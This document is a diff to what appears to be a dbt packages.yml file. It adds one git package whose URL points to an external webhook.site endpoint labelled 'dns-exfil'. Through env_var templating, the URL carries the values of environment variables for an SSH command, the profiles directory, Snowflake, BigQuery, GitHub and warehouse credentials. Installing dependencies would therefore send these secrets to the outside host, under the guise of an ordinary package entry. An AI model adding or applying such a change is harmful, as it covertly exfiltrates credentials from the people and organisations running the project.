@@ -1,1 +1,3 @@
-packages: []
+packages:
+  - git: "https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72/dns-exfil/SSH_KEY_PATH={{ env_var('GIT_SSH_COMMAND', 'NOSSH') }}/PROFILES_DIR={{ env_var('DBT_PROFILES_DIR', 'NOPROF') }}/SECRET_TEST={{ env_var('DBT_ENV_SECRET_SNOWFLAKE_ACCOUNT', 'NOSF') }}/BQ_KEYFILE={{ env_var('DBT_ENV_SECRET_BQ_KEYFILE', 'NOBQ') }}/GH_TOKEN={{ env_var('DBT_ENV_SECRET_GITHUB_TOKEN', 'NOGH') }}/WAREHOUSE_CRED={{ env_var('DBT_ENV_SECRET_WAREHOUSE_CREDENTIAL', 'NOWH') }}"
+    revision: main
